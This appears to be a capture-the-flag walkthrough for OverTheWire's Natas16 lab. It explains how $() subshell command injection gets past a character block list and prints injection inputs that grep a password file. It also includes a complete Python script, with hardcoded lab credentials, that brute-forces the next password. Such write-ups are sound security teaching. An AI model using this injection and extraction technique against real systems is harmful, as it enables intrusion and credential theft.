# 🔐 Natas16 Walkthrough

This level is similar to Natas15, but now we have **extra restrictions**!  
Check the [source code](http://natas16.natas.labs.overthewire.org/index-source.html):

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
## 🚫 Forbidden Characters  

The following characters are **blocked**, so we can’t use them for command injection:  

| 1  | 2  | 3  | 4  | 5  | 6  | 7  | 8  | 9  | 10  |
|----|----|----|----|----|----|----|----|----|-----|
| `/` | `[` | `]` | `;` | `\|` | `&` | `'` | `"` | `\` | `` ` `` |




**Good news:**  The `$` character is **still allowed**—that’s our way in!  


 ## 🌀 Subshell

Since `` '/[;|&`\'"]/' `` are forbidden, we can’t directly inject multiple commands. Luckily, the `$()` syntax is allowed, which executes a command inside a subshell. A ***subshell*** is a way to execute a command inside another command in the shell. Whatever the subshell outputs can then be used or appended in the outer command.

```shell
                                        User Input 
                                    ------------------
                                      
                                      "a$(command)b"
                                            |
                                            v
                                    PHP passthru() call
                                            |
                                            v
                        Shell sees: grep -i "a$(command)b" dictionary.txt
                                            |
                                            v
                                Subshell executes first:
                                        $(command)
                                            |
                                            v
                            Output of command replaces $(command)
                                            |
                                            v
                        Shell executes final grep command:
                        grep -i "a<command_output>b" dictionary.txt
                                            |
                                            v
                                  Result returned to user

```

## 🔍 Testing a character
Input:
```shell
$(grep e /etc/natas_webpass/natas17)squid
```


- If **e** is in the password, squid does not appear in the output. ✅

- If **e** is not, squid appears. ❌

This way, we can test each possible character in the password **without using the forbidden characters.** 


***Test:***


| INPUT    | OUTPUT |
| -------- | ------- |
| $(grep **e** /etc/natas_webpass/natas17)squid| None    |
| $(grep **a** /etc/natas_webpass/natas17)squid | squid, squid's, squidded, squidding, squids    |



Clearly, the password contains `e` and **doesnt** contain `a`. Now, as before we shall automate this process.

## Python script

This script was written with readability in mind. I've added slightly altered version of the script to this directory which has some "animations" in the console log so, feel free to use that one.

```python
import requests
import string
import time

# =====================
# === CONFIGURATION ===
# =====================
url = "http://natas16.natas.labs.overthewire.org/"
authUsername = "natas16"
authPassword = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

# Possible characters in the password (letters + digits)
charData = string.ascii_letters + string.digits

# =====================================
# === STEP 1: Find valid characters ===
# =====================================

matchingCharData = ""  # This will hold characters that exist in the password

print("Step 1: Testing which characters exist in the password...\n")

for i in charData:
    # Create the payload using subshell injection.
    # "$(grep <char> /etc/natas_webpass/natas17)squid" will execute grep on the password file.
    # If <char> exists in the password, 'squid' will NOT appear in the response.
    injection = f"$(grep {i} /etc/natas_webpass/natas17)squid"
    tempUrl = f"{url}?needle={injection}&submit=Search"

    # Send the HTTP GET request with basic auth
    response = requests.get(tempUrl, auth=(authUsername, authPassword))

    # Check response for presence of 'squid'
    if 'squid' not in response.text:
        # Character exists in the password
        matchingCharData += i
        print(f"Valid character found: '{i}'")

print(f"\nPossible password characters: {matchingCharData}\n")

# ==========================================
# === STEP 2: Brute-force password order ===
# ==========================================

password = ""  # To build the password incrementally
print("Step 2: Brute-forcing password character by character...\n")

# Natas passwords are 32 characters long
while len(password) < 32:
    for char in matchingCharData:
        # Attempt to see if the password starts with the current guess
        attempt = password + char
        injection = f"$(grep ^{attempt} /etc/natas_webpass/natas17)squid"
        tempUrl = f"{url}?needle={injection}&submit=Search"

        response = requests.get(tempUrl, auth=(authUsername, authPassword))

        if 'squid' not in response.text:
            # Correct next character found
            password += char
            print(f"Password so far: {password}")
            break  # Move to next character

# Print final password
print(f"\nPassword for natas17: {password}")
```

The output should be your natas17 password! (:


